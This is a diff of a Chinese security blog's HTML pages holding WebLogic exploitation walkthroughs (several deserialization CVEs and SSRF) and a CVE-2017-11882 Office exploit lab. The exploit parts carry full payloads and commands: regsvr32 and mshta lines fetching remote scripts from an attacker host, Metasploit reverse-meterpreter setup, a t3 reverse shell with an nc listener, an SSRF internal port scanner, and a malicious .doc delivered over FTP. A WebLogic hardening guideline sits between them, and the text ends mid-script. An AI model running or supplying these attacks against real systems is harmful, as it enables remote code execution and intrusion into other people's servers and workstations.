index="2"&gt;</span><br><span class="line"><span class="meta">string&gt;</span>regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll&lt;/string&gt;	实际要执行的 payload 代码,直接远程下载执行,linux 中可以用 wget 或者 curl,然后管道交给 bash 去执行</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>点击’go’ 之后便 meterpreter 已正常回连</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>msf模块</strong></p>
+<p>exploit/multi/http/oracle_weblogic_wsat_deserialization_rce    </p>
+<h3 id="6、-反序列化-CVE-2017-3248"><a href="#6、-反序列化-CVE-2017-3248" class="headerlink" title="6、    反序列化[CVE-2017-3248]"></a>6、    反序列化[CVE-2017-3248]</h3><blockquote>
+<p>影 响 版 本 : Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.0<br>Weblogic 12.2.1.1</p>
+</blockquote>
+<p>指定目标目标 weblogic 的 ip 端口和 JRMP 监听器的 ip [实战中肯定会直接放到自己的 vps 上搞] 端口[回连下载自己 payload 用的]</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit-CVE-2017-3248-bobsecq.py -t 192.168.3.195 -p 7001 --jip 192.168.3.14 --jport 1099 --cmd "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysopath ysoserial.jar</span><br></pre></td></tr></table></figure>
+<p>上面执行完以后,脚本会提示你启动 JRMP 监听,此时另起一个终端执行该监听,而后再回到上面去继续敲回车执行我们的 payload<br>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 ‘regsvr32 /s /n /u /i:<a href="http://192.168.3.14:8080/y8kiz" target="_blank" rel="noopener">http://192.168.3.14:8080/y8kiz</a> ans5Oa7F.sct scrobj.dll’    起监听,等待远程连接下载执行相应的 payload    </p>
+<p>最后,便会看到目标机器的 meterpreter 正常被弹回</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kiz ans5Oa7F.sct scrobj.dll'	起监听,等待远程连接下载执行相应的 payload</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<h3 id="7、-代码执行-CVE-2016-3510"><a href="#7、-代码执行-CVE-2016-3510" class="headerlink" title="7、    代码执行[CVE-2016-3510]"></a>7、    代码执行[CVE-2016-3510]</h3><p>poc:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic-CVE-2016-3510.py 192.168.3.195:7001 "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysoserial-path ysoserial.jar</span><br></pre></td></tr></table></figure>
+<h3 id="8、-代码执行-CVE-2015-4852"><a href="#8、-代码执行-CVE-2015-4852" class="headerlink" title="8、    代码执行[CVE-2015-4852]"></a>8、    代码执行[CVE-2015-4852]</h3><blockquote>
+<p>受影响版本:<br>Oracle WebLogic Server, versions 10.3.6.0, 12.1.2.0, 12.1.3.0 and 12.2.1.0</p>
+</blockquote>
+<p>直接利用 t3 协议反弹目标机器的 cmd shell</p>
+<blockquote>
+<p>python weblogic.py -u 192.168.3.11 -p 7001 -os win -t reverse_shell –LHOST 192.168.3.14 –LPORT 8081    </p>
+</blockquote>
+<blockquote>
+<p>nc -lvvp 8081    </p>
+</blockquote>
+<h3 id="9、Weblogic-ssrf"><a href="#9、Weblogic-ssrf" class="headerlink" title="9、Weblogic ssrf"></a>9、Weblogic ssrf</h3><p>Weblogic ssrf url 如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.195:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">poc url: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp; txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p>探测内网开放端口:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        final_ip = <span class="string">'&#123;ip&#125;.&#123;i&#125;'</span>.format(ip=ip, i=i)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'6379'</span>,<span class="string">'445'</span>,<span class="string">'8080'</span>,<span class="string">'3389'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'80'</span>,<span class="string">'443'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = args.url+<span class="string">'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print vul_url</span></span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)</span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Weblogic SSRF vulnerable exploit'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, dest=<span class="string">'url'</span>, required=<span class="keyword">True</span>, help=<span class="string">'Target url'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    ip = <span class="string">"192.168.4"</span></span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x02-安全加固"><a href="#0x02-安全加固" class="headerlink" title="0x02 安全加固"></a>0x02 安全加固</h2><p>1.1. 目的</p>
+<p>   本规范明确了Weblogic应用服务器安全配置方面的基本要求。为了提高Weblogic应用服务器的安全性而提出的。<br>1.2. 范围<br>   本规范适用于XXXX使用的Weblogic应用服务器。<br>\2. 强化Weblogic主机<br>2.1. 强化操作系统网络服务<br>【说明】在安装Weblogic前加固底层的操作系统。<br>2.2. 使用可以防止非授权访问的文件系统<br>【说明】确保Weblogic主机的文件系统可以防止非授权访问，例如Windows的NTFS。<br>2.3. 限制Weblogic主机上的用户数量<br>【说明】理想状况下，主机上的帐号应为2个管理员权限的帐号，1个运行Weblogic的帐号。<br>2.4. 帐号和密码<br>【说明】避免使用明显可以猜测到的帐号如”system”,”admin”或者”administrator”。口令至少8位，并满足复杂度要求。<br>2.5. 访问Weblogic资源的帐号的唯一性<br>【说明】在操作系统上建立一个专门用于Weblogic的帐号。<br>【具体配置】<br>该帐号只能操作以下三个目录：<br>1)BEA主目录。该目录是BEA多个产品的共享目录。<br>2)Weblogic安装目录。该目录包括了所有的安装程序。<br>3)域目录。该目录包括了设置文件、安全文件、日志文件和J2EE应用等。<br>赋予该帐号对以上三个目录读写执行权限。<br>2.6. 使用特殊帐号Run Weblogic Server Windows服务<br>【说明】在Windows平台，可以以Windows服务的方式运行Weblogic Server实例。这样会导致每次启动Windows自动执行Weblogic Server。而且不要以Windows administrator权限运行Weblogic Server。<br>【具体配置】<br>如何以一个特殊非管理员帐号运行Weblogic Server请参考以下：  </p>
+<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service</a></p>
+<p>验证以一个特殊非管理员帐号运行Weblogic Server请参考以下：</p>
+<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService</a><br>2.7. 不在生产机上开发<br>【说明】在开发环境中开发相应的代码，经过测试后将代码转移到生产机上。此举是为了防止开发过程中的Bug影响生产环境。<br>【具体配置】  验证DocumentRoot包括以下设置：  </p>
+<p>Order allow,deny Allow from all<br>Options None<br>AllowOverride None<br>​<br>2.8. 不在生产机上安装开发和sample软件<br>【说明】将开发工具从生产机上移除可以防止该工具被入侵者利用，一定程度地访问生产系统。<br>2.9. 启动安全审计<br>【说明】如果Weblogic运行的操作系统支持对文件和目录访问的安全审计，建议使用日志跟踪对文件和目录的拒绝访问。<br>【具体配置】<br>使用ModSecurity Core Rules限制请求的方式： </p>
+<p>modsecurity_crs_30_http_policy.conf 文件包括以下的规则，</p>
+<p># allow request methods</p>
+<p>#</p>
+<p># TODO Most applications only use GET, HEAD, and POST request</p>
+<p># methods, if so uncomment the line below. Otherwise you are advised </p>
+<p># to edit the line before uncommenting it.</p>
+<p>#  </p>
+<p>SecRule REQUEST_METHOD “!^((?:(?:POS|GE)T|OPTIONS|HEAD))$” \<br>“phase:1,log,auditlog,status:501,msg:’Method is not allowed by policy’, severity:’2’,,id:’960032’,”<br>2.10. 应用最新的BEA补丁，考虑实施官方最新的安全建议<br>【说明】如题<br>【具体配置】<br>注册BEA Advisories &amp; Notifications（<a href="http://dev2dev.bea.com/advisories" target="_blank" rel="noopener">http://dev2dev.bea.com/advisories</a>）以便收到最新的安全建议信息。  </p>
+<p>从<a href="http://commerce.beasys.com/downloads" target="_blank" rel="noopener">http://commerce.beasys.com/downloads</a>.可以下载Service Pack<br>\3. 强化网络连接<br>3.1. 使用防火墙或Weblogic Server connection filters<br>【说明】建议使用防火墙限制Weblogic Server域外到域的连接；使用Connection Filters限制Weblogic Server域内的连接。更多信息可参考<br><a href="http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter</a><br>3.2. 使用管理端口来承载管理的流量 </p>
+<p>【说明】建议使用域范围内的管理端口 Administration Port来限制同一Weblogic Server域内的server instances间的流量都经过同一端口。当不使用管理端口时，管理流量会以明文形式在网上传输。管理端口另一个好处是当遭受到拒绝服务攻击时，仍然可以通过该端口管理Weblogic Server。</p>
+<p>配合Connection Filters使用，可以指定Weblogic Server只接受来自某一IP段的管理请求，并所有连接只通过一个端口。</p>
+<p>使用管理端口可以保证客户端与管理控制台以加密的方式连接。 更多信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling</a><br>3.3. 使用管理通道 </p>
+<p>【说明】建议启用管理通道Administration Channel以确保服务器间的管理流量的安全性。没有管理通道，一些关键的管理信息会以明文传输。更多的信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/admin_domain/network.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/admin_domain/network.html</a></p>
+<p>\4. 强化Weblogic安全服务<br>4.1. 部署符合生产环境的Security Provider<br>【说明】Weblogic Security Service使用了一个可插拔的安全架构，在这个架构下可以部署多个secuirty provider。缺省条件下，Weblogic Server包括其自身的security providers,该provider已经提供了完整的安全解决方案。<br>【具体配置】<br>确保恰当地部署了security providers.<br>可以通过以下位置验证：</p>
+<p>Administration Console under the Security → Realms → RealmName→<br>Providers folder. </p>
+<p>其它信息可以参考：<a href="http://e-docs.bea.com/wls/docs70/secmanage/realm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/realm.html</a><br>4.2. 使用SSL<br>【说明】为保证数据传输安全，建议使用SSL和HTTPS替代HTTP。Weblogic Server包括一系列的开发用的Private Keys，数字证书和truseted certificate authorities。每一个下载Weblogic Server的用户都拥有对这些证书的Private Keys。禁止使用展示用的identity &amp; trust.<br>设置SSL可以参考<a href="http://e-docs.bea.com/wls/docs70/secmanage/ssl.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/ssl.html</a><br>4.3. 使用主机名验证<br>【说明】使用主机名验证以避免中间人攻击。缺省下，Weblogic SSL验证发起连接的主机是否经过授权，但实施SSL前主机名验证可能已经被禁止了。 </p>
+<p>【具体配置】<br>确保使用了Hostname 可以通过以下位置设置：<br> Administration Console on theServer s→ ServerName → Connections → SSL<br>tab.<br>4.4. 防止拒绝服务<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Servers →<br>ServerName →Connections → Protocols tab.<br>4.5. 设置帐号锁定和登录时间<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → User Lockouts tab.<br>4.6. 开启安全审计<br>【说明】如果开启了Weblogic Security Service提供的Auditing Provider，日志会存在以下位置：DomainName\DefaultAuditRecorder.log<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → Providers → Auditors page. 更多信息可以参考：<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider</a><br>4.7. 限制发送主机名和版本号<br>【说明】缺省条件下，当Weblogic Server响应HTTP请求时，在其HTTP响应的包头中包括服务器的名称和Weblogic版本号，这会导致服务器信息的泄漏。 </p>
+<p>可以通过以下位置设置： </p>
+<p> disable the Send Server Header Enabled attribute in the Administration Console. The attribute is located on the Server →ServerName → Connections → HTTP tab.<br>4.8. 默认安全角色<br>【说明】确保正确地将用户和组分配给默认的Weblogic Server Security roles. 缺省下，Weblogic是基于一系列的缺省安全角色和安全策略来保护资源。更多信息可以参考：</p>
+<p><a href="http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/中间件安全/">中间件安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-Office远程代码执行漏洞（CVE-2017-11882）"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -1622,27 +1622,27 @@
 <p><a href="https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455</a></p>
 <p><a href="https://www.anquanke.com/post/id/87311" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87311</a></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>&emsp;&emsp;登录kali攻击机，进入用户home文件中的CVE-2017-1182-payload目录。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
 <p>执行以下命令生成payload-cale.doc文件，为漏洞payload（漏洞利用程序），弹出计算机程序验证漏洞是否存在。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o payload-cale.doc</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
 <p>接下来要把payload-cale.doc文件上传到windows靶机，受害者打开doc文件，漏洞执行利用。</p>
 <p>登录windows靶机，打开FTP服务器。直接payload-cale.doc文件上传到此靶机上，真实环境下可利用社会工程学。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
 <p>打开FTP服务器。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
 <p>在kali攻击机登录ftp。输入账号密码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/FajJL8475F.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/FajJL8475F.png?imageslim" alt="mark"></p>
 <p>上传到靶机上，上传目录是桌面。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put payload-cale.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
 <p>成功上传到靶机桌面上。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
 <p>点击payload-cale.doc文件可看到执行计算机弹窗效果，实验验证成功，说明靶机存在此漏洞。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/feieClHfEe.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/feieClHfEe.png?imageslim" alt="mark"></p>
 <h3 id="第二步-漏洞利用"><a href="#第二步-漏洞利用" class="headerlink" title="第二步 漏洞利用"></a>第二步 漏洞利用</h3><p>在kali攻击机上启动msf  。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/fa84298f6f.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/fa84298f6f.png?imageslim" alt="mark"></p>
 <p>查找CVE-2017-11882 漏洞(攻击机已经集成攻击程序)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-11882</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/CVE-2017-11882</span><br></pre></td></tr></table></figure>
@@ -1655,20 +1655,20 @@
 <p>设置uri的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set URIPATH payload</span><br></pre></td></tr></table></figure></p>
 <p>运行payload,启动利用后，msf会监听本机8080端口，靶机访问192.168.0.23:8080/payload.doc，打开doc触发就会得到反弹到4444端口的tcp会话中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
 <p>在/home/college/CVE-2017-11882-payload目录下中执行以下命令：生成 payload.doc </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;mshta http://192.168.0.11[kali操作机地址]:8080 /payload&quot; -o payload.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
 <p>同样通过ftp上传到桌面上，再点击执行 payload.doc 。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br><span class="line">put payload.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
 <h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>可以看到成功反弹shell，session 1 进入meterpreter终端中。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session 1</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
 <p>查看系统信息，如下。进一步可以使用meterpreter进行后渗透攻击。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -1719,9 +1719,9 @@
 <li><a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md" target="_blank" rel="noopener">https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md</a></li>
 <li><a href="http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" target="_blank" rel="noopener">http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html</a></li>
 </ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="http://pn5jn1i1e.bkt.clouddn.com/180402/9agkkF85iF.png?imageslim" alt="mark"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="http://ps3bnv59u.bkt.clouddn.com/180402/9agkkF85iF.png?imageslim" alt="mark"></p>
 <p>nc 监听 21端口</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180402/g7lbLkGe4g.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180402/g7lbLkGe4g.png?imageslim" alt="mark"></p>
 <p>python3 批量利用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/xml"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url)</span>:</span></span><br><span class="line">    data = <span 